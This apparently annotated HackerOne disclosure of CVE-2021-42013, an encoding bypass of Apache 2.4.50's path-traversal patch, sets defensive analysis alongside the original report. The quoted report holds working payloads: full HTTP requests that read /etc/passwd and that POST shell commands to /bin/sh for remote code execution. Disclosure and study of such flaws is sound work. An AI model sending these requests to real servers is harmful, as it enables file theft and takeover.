# Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50 (CVE-2021-41773 Bypass)

## Metadata
- **Source:** HackerOne
- **Report:** 1404731 | https://hackerone.com/reports/1404731
- **Submitted:** 2021-11-18
- **Reporter:** itsecurityco
- **Program:** Apache HTTP Server
- **Bounty:** Not specified in report
- **Severity:** CRITICAL
- **Vuln:** Path Traversal, Remote Code Execution, Encoding Bypass, Improper Input Validation
- **CVEs:** CVE-2021-42013
- **Category:** memory-binary

## Summary
Researchers discovered multiple encoding bypass techniques to circumvent the CVE-2021-41773 patch in Apache 2.4.50, allowing path traversal and RCE through double-encoded and partial percent-encoding payloads. The vulnerability exploits improper normalization of URL paths containing obfuscated dot-dot sequences, enabling attackers to escape configured alias directories and execute arbitrary code.

## Attack scenario
1. Attacker identifies Apache 2.4.50 deployment with CGI enabled on aliased paths (e.g., /cgi-bin/)
2. Attacker crafts malicious URL using alternative encoding schemes: %%32%65 (double-encoded dot), .%%32%65 (partial obfuscation), or .%2%65 (incomplete encoding)
3. Attacker sends path traversal payload like /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd to bypass normalization filters
4. Server fails to properly decode and normalize the obfuscated path, treats it as valid traversal sequence
5. Attacker gains access to files outside configured directories, reading sensitive files like /etc/passwd
6. If CGI scripts are executable in traversed directories, attacker sends POST request with shell commands to /cgi-bin/%%32%65%%32%65/.../bin/sh for RCE

## Root cause
The patch for CVE-2021-41773 implemented path normalization that only addressed standard percent-encoding (%2e for dot). The vulnerability arises from incomplete encoding validation that fails to detect alternative encoding representations: double-encoding (%%32%65), mixed encoding (.%%32%65), and malformed encoding (.%2%65). The server's URL decoding logic does not iteratively normalize paths or properly handle edge cases in encoding schemes, allowing traversal sequences to bypass the fix.

## Attacker mindset
Sophisticated adversary researching patch bypass techniques through fuzzing alternative encoding schemes. Demonstrates deep understanding of URL encoding mechanisms and Apache's path normalization logic. Goal is to maintain exploit reliability across patched versions through obfuscation rather than discovering novel vulnerabilities.

## Defensive takeaways
- Implement recursive/iterative URL decoding and normalization to handle multi-layer encoding attacks
- Validate and normalize all path components before any security checks, not just standard percent-encoding
- Use allowlist-based path validation instead of blacklist approaches that can be bypassed with encoding variations
- Disable CGI execution in alias directories by default; require explicit, minimal privilege configuration
- Apply defense-in-depth: combine path normalization with proper file access controls and directory restrictions
- Conduct comprehensive fuzzing of URL encoding edge cases during security patch development
- Test patches against known bypass techniques before release; coordinate with security researchers
- Monitor for variations of reported CVEs and implement detection for suspicious encoding patterns

## Variant hunting
Look for similar bypass opportunities in: Nginx alias directive handling, IIS virtual directory traversal, other servers processing complex URL encodings. Test triple-encoding (%25%32%65), Unicode normalization (\u002e), and other encoding schemes. Examine if partial encoding combinations (.%2e) can bypass other path validation filters. Check if other Apache directives (Redirect, RewriteRule) have similar normalization gaps.

## MITRE ATT&CK
- T1190
- T1083
- T1059
- T1021

## Notes
This is a critical post-patch bypass demonstrating that initial patches often miss encoding edge cases. The multiple payload variations (4 different encoding schemes) suggest systematic fuzzing approach. RCE impact depends on CGI configuration but is catastrophic when available. Report timeline and patch coordination not specified. Researchers demonstrated responsible disclosure by reporting to Apache team.

## Full report
<details><summary>Expand</summary>

Hello Apache team,

@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.

These are the payloads:

1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65

PoC Path Traversal

GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

PoC RCE

POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: "2aa6-5cda88e8a6005-gzip"
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M

## Impact

An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

</details>

---
*Analysed by Claude on 2026-05-24*
